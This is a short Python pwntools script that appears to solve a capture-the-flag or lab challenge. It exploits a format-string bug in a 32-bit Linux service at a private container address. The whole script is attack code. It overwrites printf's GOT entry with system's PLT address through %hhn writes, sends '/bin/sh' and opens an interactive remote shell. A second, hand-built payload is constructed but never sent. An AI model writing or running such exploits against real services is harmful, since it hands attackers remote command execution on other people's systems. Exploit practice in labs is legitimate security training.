#!/usr/bin/python
#coding:utf-8

from pwn import *
context.update(arch = 'i386', os = 'linux', timeout = 1)
io = remote('172.17.0.3', 10001)

printf_got=0x08049778
system_plt=0x08048320

payload1=fmtstr_payload(5,{printf_got:system_plt})

payload=p32(printf_got)+p32(printf_got+1)+p32(printf_got+2)+p32(printf_got+3)
payload+='%'+str(0x20-16)+'c%5$hhn'
payload+='%'+str(0x83-0x20)+'c%6$hhn'
payload+='%'+str(0x104-0x83)+'c%7$hhn'
payload+='%'+str(0x8-0x4)+'c%8$hhn'

io.sendline(payload1)
sleep(0.1)
io.recv()
io.sendline('/bin/sh\x00')
io.interactive()